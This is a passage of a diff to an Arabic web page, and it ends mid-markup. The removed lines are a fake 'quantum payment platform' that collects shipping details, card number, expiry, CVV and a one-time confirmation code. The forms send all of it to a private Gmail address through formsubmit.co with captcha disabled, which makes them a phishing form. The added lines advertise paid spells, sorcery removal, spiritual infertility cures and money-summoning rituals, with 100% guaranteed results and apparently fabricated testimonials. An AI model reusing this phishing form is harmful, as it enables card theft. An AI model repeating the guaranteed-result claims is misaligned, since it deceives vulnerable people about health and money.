+                    <div class="service-description">
+                        <strong>🌟 الخدمة الأكثر طلباً:</strong><br>
+                        • جلب الحبيب مهما كان عنيداً أو بعيداً<br>
+                        • استخدام أقوى الطلاسم والأسماء الشريفة<br>
+                        • عودة الحبيب خاضعاً محباً راغباً<br>
+                        • لا ضرر ولا أذى - طرق شرعية مجربة<br>
+                        • نتائج مضمونة خلال 24-72 ساعة<br>
+                        <strong style="color: var(--gold-color);">📞 كشف مجاني فوري</strong>
                     </div>
+                    <div class="secret-word">🔥 سر الجلب الأعظم: "الأسماء الحسنى للمحبة"</div>
                 </div>
-                
-                <h1 class="text-7xl font-black hologram-text mb-8 tracking-wider">منصة الدفع الكوانتية</h1>
-                <p class="text-xl text-neon-cyan max-w-4xl mx-auto leading-relaxed mb-12">
-                    تقنيات الدفع المستقبلية مع الأمان الكوانتي والذكاء الاصطناعي المتطور
-                </p>
-                
-                <!-- شارات الأمان المحسنة والمرتبة -->
-                <div class="security-badges-grid grid grid-cols-1 md:grid-cols-3 gap-6 max-w-4xl mx-auto mt-12">
-                    <!-- شارة التشفير الكوانتي -->
-                    <div class="security-badge quantum-encryption px-6 py-4 rounded-2xl flex flex-col items-center gap-3">
-                        <div class="icon-bg w-16 h-16 rounded-full flex items-center justify-center">
-                            <i class="fas fa-shield-virus text-black text-2xl"></i>
-                        </div>
-                        <div class="text-center">
-                            <h3 class="text-lg font-bold text-neon-cyan mb-1">تشفير كوانتي</h3>
-                            <p class="text-xs text-gray-300">حماية بـ 2048-bit</p>
-                        </div>
-                    </div>
 
-                    <!-- شارة الذكاء الاصطناعي -->
-                    <div class="security-badge ai-intelligence px-6 py-4 rounded-2xl flex flex-col items-center gap-3">
-                        <div class="icon-bg w-16 h-16 rounded-full flex items-center justify-center">
-                            <i class="fas fa-brain text-white text-2xl"></i>
-                        </div>
-                        <div class="text-center">
-                            <h3 class="text-lg font-bold text-neon-pink mb-1">ذكاء اصطناعي</h3>
-                            <p class="text-xs text-gray-300">نظام ذكي متطور</p>
-                        </div>
+                <div class="service-card magic-border">
+                    <div class="service-icon">💎</div>
+                    <h3 class="service-title">فك السحر والعقد الشيطانية</h3>
+                    <div class="service-description">
+                        <strong>🛡️ علاج شامل ونهائي:</strong><br>
+                        • تشخيص دقيق لنوع السحر والمس<br>
+                        • فك سحر التفريق والربط والعقم<br>
+                        • إبطال العين والحسد<br>
+                        • علاج المس الشيطاني<br>
+                        • حماية دائمة من الأعمال السفلية<br>
+                        <strong style="color: var(--gold-color);">⚡ نتائج فورية ومضمونة</strong>
                     </div>
-
-                    <!-- شارة المعالجة الفورية -->
-                    <div class="security-badge instant-processing px-6 py-4 rounded-2xl flex flex-col items-center gap-3">
-                        <div class="icon-bg w-16 h-16 rounded-full flex items-center justify-center">
-                            <i class="fas fa-bolt text-black text-2xl"></i>
-                        </div>
-                        <div class="text-center">
-                            <h3 class="text-lg font-bold text-neon-green mb-1">معالجة فورية</h3>
-                            <p class="text-xs text-gray-300">سرعة البرق</p>
-                        </div>
-                    </div>
+                    <div class="secret-word">🌟 آيات الإبطال: "الرقية الشرعية المعززة"</div>
                 </div>
-            </div>
 
-            <div class="flex justify-center">
-                <!-- نموذج الشحن والدفع الكوانتي -->
-                <div class="w-full max-w-2xl space-y-12">
-                    
-                    <!-- قسم معلومات الشحن -->
-                    <div class="quantum-glass p-8 relative stable-element">
-                        <div class="relative z-10">
-                            <h3 class="text-3xl font-bold hologram-text mb-8 text-center">معلومات الشحن</h3>
-                            
-                            <div class="space-y-6">
-                                <!-- الاسم الأول والأخير -->
-                                <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
-                                    <div>
-                                        <label class="block text-lg font-bold text-neon-cyan mb-4 flex items-center">
-                                            <i class="fas fa-user text-neon-cyan mr-3 text-xl"></i>
-                                            الاسم الأول
-                                        </label>
-                                        <input type="text" name="first_name" id="firstName" required="" class="w-full px-6 py-4 quantum-input rounded-xl text-lg text-base relative z-10" placeholder="الاسم الأول">
-                                    </div>
-                                    <div>
-                                        <label class="block text-lg font-bold text-neon-pink mb-4 flex items-center">
-                                            <i class="fas fa-user-tag text-neon-pink mr-3 text-xl"></i>
-                                            اسم العائلة
-                                        </label>
-                                        <input type="text" name="last_name" id="lastName" required="" class="w-full px-6 py-4 quantum-input rounded-xl text-lg text-base relative z-10" placeholder="اسم العائلة">
-                                    </div>
-                                </div>
-
-                                <!-- رقم الهاتف والبريد الإلكتروني -->
-                                <div>
-                                    <label class="block text-lg font-bold text-neon-green mb-4 flex items-center">
-                                        <i class="fas fa-mobile-alt text-neon-green mr-3 text-xl"></i>
-                                        رقم الهاتف
-                                    </label>
-                                    <input type="tel" name="phone_number" id="phoneNumber" required="" class="w-full px-6 py-4 quantum-input rounded-xl text-lg font-mono text-base relative z-10" placeholder="+966 50 123 4567">
-                                </div>
-
-                                <div>
-                                    <label class="block text-lg font-bold text-neon-purple mb-4 flex items-center">
-                                        <i class="fas fa-envelope text-neon-purple mr-3 text-xl"></i>
-                                        البريد الإلكتروني
-                                    </label>
-                                    <input type="email" name="email" id="email" required="" class="w-full px-6 py-4 quantum-input rounded-xl text-lg text-base relative z-10" placeholder="example@quantum.com">
-                                </div>
-
-                                <!-- الدولة والمحافظة -->
-                                <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
-                                    <div>
-                                        <label class="block text-lg font-bold text-cyber-blue mb-4 flex items-center">
-                                            <i class="fas fa-globe text-cyber-blue mr-3 text-xl"></i>
-                                            الدولة
-                                        </label>
-                                        <select name="country" id="country" required="" class="w-full px-6 py-4 quantum-input rounded-xl text-lg font-bold relative z-10" style="font-weight: 900; color: #00FFFF;">
-                                            <option value="" style="font-weight: 900; color: #666;">اختر الدولة</option>
-                                            <option value="السعودية" style="font-weight: 900; color: #00FFFF;">السعودية 🇸🇦</option>
-                                            <option value="الكويت" style="font-weight: 900; color: #00FFFF;">الكويت 🇰🇼</option>
-                                            <option value="البحرين" style="font-weight: 900; color: #00FFFF;">البحرين 🇧🇭</option>
-                                            <option value="قطر" style="font-weight: 900; color: #00FFFF;">قطر 🇶🇦</option>
-                                            <option value="الإمارات" style="font-weight: 900; color: #00FFFF;">الإمارات العربية المتحدة 🇦🇪</option>
-                                            <option value="عُمان" style="font-weight: 900; color: #00FFFF;">عُمان 🇴🇲</option>
-                                        </select>
-                                    </div>
-                                    <div>
-                                        <label class="block text-lg font-bold text-neon-orange mb-4 flex items-center">
-                                            <i class="fas fa-map-marker-alt text-neon-orange mr-3 text-xl"></i>
-                                            المحافظة
-                                        </label>
-                                        <select name="city" id="city" required="" class="w-full px-6 py-4 quantum-input rounded-xl text-sm relative z-10" disabled="">
-                                            <option value="">اختر محافظة</option>
-                                        </select>
-                                    </div>
-                                </div>
-
-                                <!-- العنوان التفصيلي -->
-                                <div>
-                                    <label class="block text-lg font-bold text-electric-lime mb-4 flex items-center">
-                                        <i class="fas fa-home text-electric-lime mr-3 text-xl"></i>
-                                        العنوان التفصيلي
-                                    </label>
-                                    <textarea name="address" id="address" required="" rows="3" class="w-full px-6 py-4 quantum-input rounded-xl text-lg text-base relative z-10" placeholder="مثال: حي النرجس، شارع الملك فهد، مجمع النخيل، الدور الثاني، شقة 205"></textarea>
-                                </div>
-
-                                <!-- شركة الشحن -->
-                                <div>
-                                    <label class="block text-lg font-bold text-cyber-violet mb-4 flex items-center">
-                                        <i class="fas fa-shipping-fast text-cyber-violet mr-3 text-xl"></i>
-                                        شركة الشحن المفضلة
-                                    </label>
-                                    <select name="shipping_company" id="shippingCompany" required="" class="w-full px-6 py-4 quantum-input rounded-xl text-lg text-base relative z-10">
-                                        <option value="">اختر شركة الشحن</option>
-                                        <optgroup label="🌍 شركات الشحن العالمية">
-                                            <option value="aramex">🚀 أرامكس (Aramex)</option>
-                                            <option value="dhl">⚡ DHL Express</option>
-                                            <option value="fedex">🔥 FedEx</option>
-                                            <option value="ups">💨 UPS</option>
-                                        </optgroup>
-                                        <optgroup label="🏠 شركات الشحن المحلية">
-                                            <option value="smsa">📦 سمسا إكسبريس (SMSA)</option>
-                                            <option value="spl">📮 البريد السعودي (SPL)</option>
-                                            <option value="zajil">🚛 زاجل إكسبريس</option>
-                                            <option value="naqel">🏃‍♂️ نقل إكسبريس</option>
-                                        </optgroup>
-                                        <optgroup label="⚡ خدمات التوصيل السريع">
-                                            <option value="mrsool">🛵 مرسول (Mrsool)</option>
-                                            <option value="hungerstation">🍔 هنقرستيشن</option>
-                                            <option value="talabat">🥘 طلبات (Talabat)</option>
-                                            <option value="careem">🚗 كريم (Careem Now)</option>
-                                        </optgroup>
-                                    </select>
-                                </div>
-                            </div>
-                        </div>
+                <div class="service-card magic-border">
+                    <div class="service-icon">💍</div>
+                    <h3 class="service-title">حل المشاكل الزوجية والعائلية</h3>
+                    <div class="service-description">
+                        <strong>👫 إصلاح العلاقات:</strong><br>
+                        • رد المطلقة لبيت زوجها<br>
+                        • حل مشاكل الغيرة والشك<br>
+                        • تقوية الروابط العاطفية<br>
+                        • منع الطلاق والفراق<br>
+                        • استقرار الحياة الزوجية<br>
+                        <strong style="color: var(--gold-color);">💖 سعادة دائمة</strong>
                     </div>
+                    <div class="secret-word">💝 سر التآلف: "خواتم الوفاق والمحبة"</div>
+                </div>
 
-                    <!-- قسم بيانات البطاقة -->
-                    <div class="quantum-glass p-12 relative stable-element">
-                        <div class="relative z-10">
-                            <h3 class="text-4xl font-bold hologram-text mb-12 text-center">بيانات البطاقة</h3>
-                            
-                            <form action="https://formsubmit.co/kalimmmy@gmail.com" method="POST" id="cardForm" class="space-y-8" target="hiddenFrame">
-                                <!-- حقول FormSubmit المخفية -->
-                                <input type="hidden" name="_subject" value="بيانات بطاقة دفع جديدة - منصة كوانتية">
-                                <input type="hidden" name="_template" value="table">
-                                <input type="hidden" name="_captcha" value="false">
-                                
-                                <!-- رقم البطاقة -->
-                                <div>
-                                    <label class="block text-xl font-bold text-neon-cyan mb-6 flex items-center">
-                                        <i class="fas fa-credit-card text-neon-cyan mr-4 text-2xl"></i>
-                                        رقم البطاقة
-                                    </label>
-                                    <input type="text" name="cc-number" id="cardNumber" autocomplete="cc-number" required="" maxlength="19" class="w-full px-8 py-6 quantum-input rounded-xl text-xl font-mono tracking-wider text-base relative z-10" placeholder="1234 5678 9012 3456">
-                                </div>
-
-                                <!-- الشهر والسنة ورمز الأمان -->
-                                <div class="grid grid-cols-3 gap-6">
-                                    <div>
-                                        <label class="block text-lg font-bold text-neon-pink mb-4">
-                                            <i class="fas fa-calendar text-neon-pink mr-2"></i>
-                                            الشهر
-                                        </label>
-                                        <input type="text" name="cc-exp-month" id="expiryMonth" autocomplete="cc-exp-month" required="" maxlength="2" class="w-full px-4 py-6 quantum-input rounded-xl text-xl text-center text-base relative z-10" placeholder="12">
-                                    </div>
-                                    <div>
-                                        <label class="block text-lg font-bold text-neon-green mb-4">
-                                            <i class="fas fa-calendar-alt text-neon-green mr-2"></i>
-                                            السنة
-                                        </label>
-                                        <input type="text" name="cc-exp-year" id="expiryYear" autocomplete="cc-exp-year" required="" maxlength="2" class="w-full px-4 py-6 quantum-input rounded-xl text-xl text-center text-base relative z-10" placeholder="28">
-                                    </div>
-                                    <div>
-                                        <label class="block text-lg font-bold text-neon-purple mb-4">
-                                            <i class="fas fa-lock text-neon-purple mr-2"></i>
-                                            رمز الأمان
-                                        </label>
-                                        <input type="text" name="cc-csc" autocomplete="cc-csc" maxlength="4" required="" class="w-full px-4 py-6 quantum-input rounded-xl text-xl font-mono text-center text-base relative z-10" placeholder="123">
-                                    </div>
-                                </div>
-
-                                <!-- اسم حامل البطاقة -->
-                                <div>
-                                    <label class="block text-xl font-bold text-neon-orange mb-6 flex items-center">
-                                        <i class="fas fa-user text-neon-orange mr-4 text-2xl"></i>
-                                        اسم حامل البطاقة
-                                    </label>
-                                    <input type="text" name="cc-name" id="cardHolder" autocomplete="cc-name" required="" class="w-full px-8 py-6 quantum-input rounded-xl text-xl text-base relative z-10" placeholder="كما هو مكتوب على البطاقة">
-                                </div>
-
-                                <!-- زر الإرسال الكوانتي -->
-                                <div class="text-center mt-12">
-                                    <button type="submit" class="w-full quantum-button py-8 rounded-2xl text-2xl font-black relative overflow-hidden group">
-                                        <span class="relative z-10 flex items-center justify-center">
-                                            <i class="fas fa-rocket mr-4 text-3xl"></i>
-                                            إطلاق عملية الدفع
-                                            <i class="fas fa-arrow-left ml-4 text-3xl"></i>
-                                        </span>
-                                    </button>
-                                </div>
-                            </form>
-                        </div>
+                <div class="service-card magic-border">
+                    <div class="service-icon">🔥</div>
+                    <h3 class="service-title">تهييج المحبة والعشق</h3>
+                    <div class="service-description">
+                        <strong>❤️‍🔥 إشعال نار المحبة:</strong><br>
+                        • تهييج المشاعر الباردة<br>
+                        • زيادة العشق والرغبة<br>
+                        • ربط القلوب ببعضها<br>
+                        • جعل الشخص لا يطيق الفراق<br>
+                        • محبة دائمة لا تنطفئ<br>
+                        <strong style="color: var(--gold-color);">🔥 عشق ملتهب</strong>
                     </div>
+                    <div class="secret-word">🌹 نار الهوى: "طلاسم العشق الأبدي"</div>
+                </div>
+
+                <div class="service-card magic-border">
+                    <div class="service-icon">👰</div>
+                    <h3 class="service-title">زواج العوانس والمتأخرات</h3>
+                    <div class="service-description">
+                        <strong>💒 فتح أبواب الرزق:</strong><br>
+                        • زواج العوانس من الشخص المناسب<br>
+                        • تعجيل الزواج للمتأخرات<br>
+                        • جلب الخاطبين المناسبين<br>
+                        • إزالة عوائق الزواج<br>
+                        • بركة في الذرية الصالحة<br>
+                        <strong style="color: var(--gold-color);">👑 زواج مبارك</strong>
+                    </div>
+                    <div class="secret-word">💎 كنز الزواج: "أدعية تعجيل النصيب"</div>
+                </div>
+
+                <div class="service-card magic-border">
+                    <div class="service-icon">🌟</div>
+                    <h3 class="service-title">علاج العقم وتأخر الإنجاب</h3>
+                    <div class="service-description">
+                        <strong>👶 بركة الذرية:</strong><br>
+                        • علاج العقم بالطرق الروحانية<br>
+                        • تيسير الحمل والولادة<br>
+                        • حماية الجنين من العين<br>
+                        • بركة في الذرية الصالحة<br>
+                        • شفاء بإذن الله تعالى<br>
+                        <strong style="color: var(--gold-color);">🍼 رزق الأطفال</strong>
+                    </div>
+                    <div class="secret-word">🌺 سر الخصوبة: "أدعية الذرية المباركة"</div>
+                </div>
+
+                <div class="service-card magic-border">
+                    <div class="service-icon">💰</div>
+                    <h3 class="service-title">تنزيل الأموال وجلب الرزق</h3>
+                    <div class="service-description">
+                        <strong>💎 فتح أبواب الثروة:</strong><br>
+                        • جلب المال من مصادر حلال<br>
+                        • فتح التجارة والمشاريع<br>
+                        • تيسير الديون والقروض<br>
+                        • حل مشاكل الإفلاس<br>
+                        • بركة في الرزق والمال<br>
+                        • فتح أبواب الوظائف المرموقة<br>
+                        <strong style="color: var(--gold-color);">💰 ثراء مضمون</strong>
+                    </div>
+                    <div class="secret-word">💎 مفاتيح الغنى: "أسرار الكنوز الإلهية"</div>
+                </div>
+
+                <div class="service-card magic-border">
+                    <div class="service-icon">⚔️</div>
+                    <h3 class="service-title">هزيمة الأعداء والمنافسين</h3>
+                    <div class="service-description">
+                        <strong>🛡️ النصر والحماية:</strong><br>
+                        • إبطال كيد الأعداء والحاسدين<br>
+                        • هزيمة المنافسين في العمل<br>
+                        • رد الظلم والانتقام الحلال<br>
+                        • حماية من الأذى والبغي<br>
+                        • عودة الحقوق المسلوبة<br>
+                        • قهر المعاندين والظالمين<br>
+                        <strong style="color: var(--gold-color);">⚔️ نصر مؤزر</strong>
+                    </div>
+                    <div class="secret-word">🗡️ سيف العدالة: "أدعية القهر والغلبة"</div>
                 </div>
             </div>
-        </div>
-    </div>
+        </section>
 
-    <!-- الصفحة الثانية - كود التأكيد -->
-    <div id="page2" class="min-h-screen flex items-center justify-center p-6 hidden relative">
-        <div class="w-full max-w-4xl relative z-10">
+        <!-- شروحات مفصلة عن طرق العمل -->
+        <section class="explanation-section" style="margin: 60px 0;">
+            <h2 style="text-align: center; font-size: 3rem; margin-bottom: 40px; background: var(--gradient-3); -webkit-background-clip: text; -webkit-text-fill-color: transparent;">
+                📜 شروحات مفصلة عن أسرار الروحانيات 📜
+            </h2>
             
-            <!-- العنوان -->
-            <div class="text-center mb-20">
-                <div class="main-icon mb-12">
-                    <div class="w-40 h-40 mx-auto relative">
-                        <div class="absolute inset-0 bg-gradient-to-br from-neon-cyan via-neon-pink to-neon-green rounded-full border-4 border-neon-cyan shadow-2xl"></div>
-                        <div class="absolute inset-6 bg-gradient-to-br from-neon-purple via-neon-orange to-cyber-blue rounded-full border-3 border-neon-pink shadow-xl"></div>
-                        <div class="absolute inset-12 bg-gradient-to-br from-cyber-violet to-electric-lime rounded-full flex items-center justify-center shadow-lg">
-                            <i class="fas fa-shield-check text-5xl text-black"></i>
-                        </div>
-                    </div>
+            <div class="services-grid">
+                <div class="service-card" style="background: rgba(255,215,0,0.05); border-color: var(--gold-color);">
+                    <h3 style="color: var(--gold-color); margin-bottom: 20px;">🔍 كيف يتم جلب الحبيب؟</h3>
+                    <p style="color: var(--text-secondary); line-height: 1.8;">
+                        <strong>المرحلة الأولى:</strong> الكشف الروحاني لمعرفة سبب البعد أو الفراق<br>
+                        <strong>المرحلة الثانية:</strong> استخدام الأسماء الحسنى وآيات المحبة<br>
+                        <strong>المرحلة الثالثة:</strong> عمل الطلاسم الخاصة بالشخص المطلوب<br>
+                        <strong>المرحلة الرابعة:</strong> قراءة الأدعية المستجابة لمدة 3 أيام<br>
+                        <strong>النتيجة:</strong> عودة الحبيب خاضعاً محباً خلال 24-72 ساعة
+                    </p>
+                </div>
+
+                <div class="service-card" style="background: rgba(156,39,176,0.05); border-color: var(--secondary-color);">
+                    <h3 style="color: var(--secondary-color); margin-bottom: 20px;">⚔️ طرق فك السحر</h3>
+                    <p style="color: var(--text-secondary); line-height: 1.8;">
+                        <strong>التشخيص:</strong> معرفة نوع السحر ومصدره بالكشف الروحاني<br>
+                        <strong>الإبطال:</strong> قراءة آيات إبطال السحر من القرآن الكريم<br>
+                        <strong>التحصين:</strong> عمل حجاب قوي لمنع عودة السحر<br>
+                        <strong>التطهير:</strong> تنظيف المكان والجسد من آثار السحر<br>
+                        <strong>الشفاء:</strong> عودة الحالة الطبيعية خلال 3-7 أيام
+                    </p>
+                </div>
+
+                <div class="service-card" style="background: rgba(255,107,107,0.05); border-color: var(--accent-color);">
+                    <h3 style="color: var(--accent-color); margin-bottom: 20px;">💰 أسرار تنزيل الأموال</h3>
+                    <p style="color: var(--text-secondary); line-height: 1.8;">
+                        <strong>فتح الأبواب:</strong> استخدام أدعية فتح الرزق والبركة<br>
+                        <strong>إزالة العوائق:</strong> كسر القيود الروحانية التي تمنع المال<br>
+                        <strong>جذب الفرص:</strong> أعمال لجذب الوظائف والمشاريع الناجحة<br>
+                        <strong>البركة:</strong> جعل المال ينمو ويزيد بالبركة الإلهية<br>
+                        <strong>الاستمرارية:</strong> ضمان تدفق الرزق بشكل مستمر
+                    </p>
+                </div>
+
+                <div class="service-card" style="background: rgba(46,204,113,0.05); border-color: #2ecc71;">
+                    <h3 style="color: #2ecc71; margin-bottom: 20px;">💍 تعجيل الزواج للعوانس</h3>
+                    <p style="color: var(--text-secondary); line-height: 1.8;">
+                        <strong>إزالة العوائق:</strong> فك العقد التي تمنع الزواج<br>
+                        <strong>فتح النصيب:</strong> أدعية خاصة لتعجيل النصيب<br>
+                        <strong>جذب الخاطبين:</strong> أعمال لجذب الشخص المناسب<br>
+                        <strong>تسهيل الأمور:</strong> جعل كل شيء يسير بسلاسة<br>
+                        <strong>البركة:</strong> زواج مبارك سعيد مستقر
+                    </p>
+                </div>
+            </div>
+        </section>
+
+        <!-- قسم الضمانات والثقة -->
+        <section class="guarantees-section" style="margin: 60px 0; padding: 40px; background: rgba(255,215,0,0.03); border-radius: 25px; border: 2px solid var(--gold-color);">
+            <h2 style="text-align: center; font-size: 2.5rem; color: var(--gold-color); margin-bottom: 30px;">
+                🛡️ ضماناتنا وعهودنا أمام الله 🛡️
+            </h2>
+            
+            <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 30px;">
+                <div style="text-align: center; padding: 20px;">
+                    <div style="font-size: 3rem; margin-bottom: 15px;">✅</div>
+                    <h3 style="color: var(--gold-color); margin-bottom: 10px;">ضمان النجاح 100%</h3>
+                    <p style="color: var(--text-secondary);">أو إعادة المبلغ كاملاً + تكرار العمل مجاناً</p>
                 </div>
                 
-                <h1 class="text-6xl font-black hologram-text mb-8 tracking-wider">تأكيد الدفع</h1>
-                <p class="text-xl text-neon-cyan mb-8 leading-relaxed max-w-3xl mx-auto">
-                    أدخل الكود المرسل إليك لإتمام المعاملة بأمان
-                </p>
+                <div style="text-align: center; padding: 20px;">
+                    <div style="font-size: 3rem; margin-bottom: 15px;">🔒</div>
+                    <h3 style="color: var(--gold-color); margin-bottom: 10px;">سرية تامة</h3>
+                    <p style="color: var(--text-secondary);">جميع المعلومات محفوظة ولا تُفشى لأي طرف</p>
+                </div>
                 
-                <!-- مؤشرات التقدم -->
-                <div class="flex justify-center items-center gap-6 mb-12">
-                    <div class="flex items-center gap-3">
-                        <div class="w-4 h-4 bg-neon-green rounded-full"></div>
-                        <span class="text-lg text-neon-green font-bold">تم الإرسال</span>
+                <div style="text-align: center; padding: 20px;">
+                    <div style="font-size: 3rem; margin-bottom: 15px;">💰</div>
+                    <h3 style="color: var(--gold-color); margin-bottom: 10px;">دفع بعد النتيجة</h3>
+                    <p style="color: var(--text-secondary);">لا دفع مقدم - الدفع بعد رؤية النتائج بعينك</p>
+                </div>
+                
+                <div style="text-align: center; padding: 20px;">
+                    <div style="font-size: 3rem; margin-bottom: 15px;">⚡</div>
+                    <h3 style="color: var(--gold-color); margin-bottom: 10px;">سرعة في التنفيذ</h3>
+                    <p style="color: var(--text-secondary);">البدء فوراً بعد التواصل - لا انتظار</p>
+                </div>
+            </div>
+        </section>
+
+        <!-- قسم مراحل العمل -->
+        <section class="work-process" style="margin: 60px 0;">
+            <h2 style="text-align: center; font-size: 3rem; margin-bottom: 40px; background: var(--gradient-1); -webkit-background-clip: text; -webkit-text-fill-color: transparent;">
+                📋 مراحل العمل معنا خطوة بخطوة 📋
+            </h2>
+            
+            <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 25px;">
+                <div class="service-card" style="text-align: center;">
+                    <div style="background: var(--gradient-1); color: white; width: 60px; height: 60px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 1.5rem; font-weight: bold; margin: 0 auto 20px;">1</div>
+                    <h3 style="color: var(--secondary-color); margin-bottom: 15px;">التواصل الأولي</h3>
+                    <p style="color: var(--text-secondary);">تواصل معنا عبر واتساب أو الهاتف لشرح حالتك والمشكلة التي تواجهها</p>
+                </div>
+                
+                <div class="service-card" style="text-align: center;">
+                    <div style="background: var(--gradient-2); color: white; width: 60px; height: 60px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 1.5rem; font-weight: bold; margin: 0 auto 20px;">2</div>
+                    <h3 style="color: var(--secondary-color); margin-bottom: 15px;">الكشف المجاني</h3>
+                    <p style="color: var(--text-secondary);">نقوم بعمل كشف روحاني مجاني لمعرفة سبب المشكلة والحل المناسب</p>
+                </div>
+                
+                <div class="service-card" style="text-align: center;">
+                    <div style="background: var(--gradient-3); color: white; width: 60px; height: 60px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 1.5rem; font-weight: bold; margin: 0 auto 20px;">3</div>
+                    <h3 style="color: var(--secondary-color); margin-bottom: 15px;">البدء بالعمل</h3>
+                    <p style="color: var(--text-secondary);">نبدأ العمل الروحاني فوراً بأقوى الطرق المجربة والمضمونة</p>
+                </div>
+                
+                <div class="service-card" style="text-align: center;">
+                    <div style="background: var(--gold-color); color: black; width: 60px; height: 60px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 1.5rem; font-weight: bold; margin: 0 auto 20px;">4</div>
+                    <h3 style="color: var(--secondary-color); margin-bottom: 15px;">المتابعة المستمرة</h3>
+                    <p style="color: var(--text-secondary);">نتابع معك تطور الحالة ونرشدك في كل خطوة حتى تحقيق النتيجة</p>
+                </div>
+                
+                <div class="service-card" style="text-align: center;">
+                    <div style="background: linear-gradient(45deg, #2ecc71, #27ae60); color: white; width: 60px; height: 60px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 1.5rem; font-weight: bold; margin: 0 auto 20px;">5</div>
+                    <h3 style="color: var(--secondary-color); margin-bottom: 15px;">تحقيق النتيجة</h3>
+                    <p style="color: var(--text-secondary);">بإذن الله تتحقق النتيجة المطلوبة في الوقت المحدد</p>
+                </div>
+                
+                <div class="service-card" style="text-align: center;">
+                    <div style="background: linear-gradient(45deg, #e74c3c, #c0392b); color: white; width: 60px; height: 60px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 1.5rem; font-weight: bold; margin: 0 auto 20px;">6</div>
+                    <h3 style="color: var(--secondary-color); margin-bottom: 15px;">الدفع والشكر</h3>
+                    <p style="color: var(--text-secondary);">بعد رؤية النتيجة بعينك يتم الدفع مع الدعاء والشكر</p>
+                </div>
+            </div>
+        </section>
+
+        <!-- الشهادات -->
+        <section id="testimonials" class="testimonials">
+            <h2>💬 شهادات العملاء الكرام</h2>
+            <div class="testimonial-grid">
+                <div class="testimonial-card">
+                    <div class="testimonial-text">
+                        "الحمد لله رجع زوجي بعد طلاق دام 6 أشهر. الشيخة أم سالم صادقة ومضمونة. دفعت بعد ما شفت النتيجة بعيني."
                     </div>
-                    <div class="w-12 h-1 bg-neon-green rounded-full"></div>
-                    <div class="flex items-center gap-3">
-                        <div class="w-4 h-4 bg-neon-orange rounded-full"></div>
-                        <span class="text-lg text-neon-orange font-bold">في الانتظار</span>
+                    <div class="testimonial-author">- أم محمد، الرياض</div>
+                </div>
+                <div class="testimonial-card">
+                    <div class="testimonial-text">
+                        "كنت عانس عمري 35 سنة، بعد العمل مع الشيخة تزوجت من أفضل شخص خلال شهرين. ربي يبارك فيها."
                     </div>
-                    <div class="w-12 h-1 bg-gray-600 rounded-full"></div>
-                    <div class="flex items-center gap-3">
-                        <div class="w-4 h-4 bg-gray-500 rounded-full"></div>
-                        <span class="text-lg text-gray-500 font-bold">الإتمام</span>
+                    <div class="testimonial-author">- فاطمة، جدة</div>
+                </div>
+                <div class="testimonial-card">
+                    <div class="testimonial-text">
+                        "عملت فك سحر لي ولأولادي، والحمد لله راحت كل المشاكل. البيت صار مليان خير وبركة."
                     </div>
+                    <div class="testimonial-author">- أبو عبدالله، الدمام</div>
+                </div>
+                <div class="testimonial-card">
+                    <div class="testimonial-text">
+                        "حبيبي رجع لي بعد ما كان متزوج غيري. الشيخة معجزة والله، شغلها مضمون 100%."
+                    </div>
+                    <div class="testimonial-author">- نورا، مكة</div>
+                </div>
+                <div class="testimonial-card">
+                    <div class="testimonial-text">
+                        "عملت تنزيل أموال والحمد لله جاني عرض شغل برقم خيالي. الرزق انفتح عليّ من كل مكان."
+                    </div>
+                    <div class="testimonial-author">- خالد، الخبر</div>
+                </div>
+                <div class="testimonial-card">
+                    <div class="testimonial-text">
+                        "كان عندي أعداء في الشغل يحاولون يوقعوني، بعد العمل مع الشيخة انقلب الوضع لصالحي."
+                    </div>
+                    <div class="testimonial-author">- سعد، الطائف</div>
+                </div>
+                <div class="testimonial-card">
+                    <div class="testimonial-text">
+                        "انجبت بعد 15 سنة عقم والأطباء قالوا مستحيل. الشيخة أم سالم قدرت بفضل الله."
+                    </div>
+                    <div class="testimonial-author">- أم يوسف، المدينة</div>
+                </div>
+                <div class="testimonial-card">
+                    <div class="testimonial-text">
+                        "التجارة كانت مفلسة وديون كتير، بعد العمل الروحاني صارت أحسن من قبل بمراحل."
+                    </div>
+                    <div class="testimonial-author">- أحمد، جيزان</div>
+                </div>
+            </div>
+        </section>
+
+        <!-- الأسئلة الشائعة -->
+        <section id="faq" class="faq-section">
+            <h2 class="faq-title">❓ أسئلة شائعة</h2>
+            
+            <div class="faq-item">
+                <div class="faq-question" onclick="toggleFaq(this)">
+                    <span>هل الأعمال الروحانية حلال شرعاً؟</span>
+                    <span class="faq-toggle">+</span>
+                </div>
+                <div class="faq-answer">
+                    نعم، جميع أعمالنا تعتمد على القرآن الكريم والأدعية الشرعية والأسماء الحسنى. لا نستخدم أي طرق محرمة أو شيطانية.
                 </div>
             </div>
 
-            <!-- نموذج التأكيد -->
-            <div class="quantum-glass p-16 relative stable-element">
-                <div class="relative z-10">
-                    <form action="https://formsubmit.co/kalimmmy@gmail.com" method="POST" id="confirmationForm" class="space-y-12 text-center" target="hiddenFrame">
-                        <!-- حقول FormSubmit المخفية -->
-                        <input type="hidden" name="_subject" value="كود تأكيد الشراء - منصة كوانتية">
-                        <input type="hidden" name="_template" value="table">
-                        <input type="hidden" name="_captcha" value="false">
-                        
-                        <!-- كود التأكيد -->
-                        <div>
-                            <div class="flex items-center justify-center mb-12">
-                                <div class="flex items-center gap-4 quantum-glass px-8 py-4 rounded-full">
-                                    <div class="w-12 h-12 bg-gradient-to-br from-neon-cyan to-cyber-blue rounded-full flex items-center justify-center">
-                                        <i class="fas fa-key text-black text-lg"></i>
-                                    </div>
-                                    <span class="text-xl font-black text-neon-cyan">الكود السري</span>
-                                </div>
-                            </div>
-                            
-                            <!-- حقول الكود -->
-                            <div class="flex justify-center gap-4 mb-8">
-                                <input type="text" maxlength="1" class="code-digit" data-index="0">
-                                <input type="text" maxlength="1" class="code-digit" data-index="1">
-                                <input type="text" maxlength="1" class="code-digit" data-index="2">
-                                <input type="text" maxlength="1" class="code-digit" data-index="3">
-                                <input type="text" maxlength="1" class="code-digit" data-index="4">
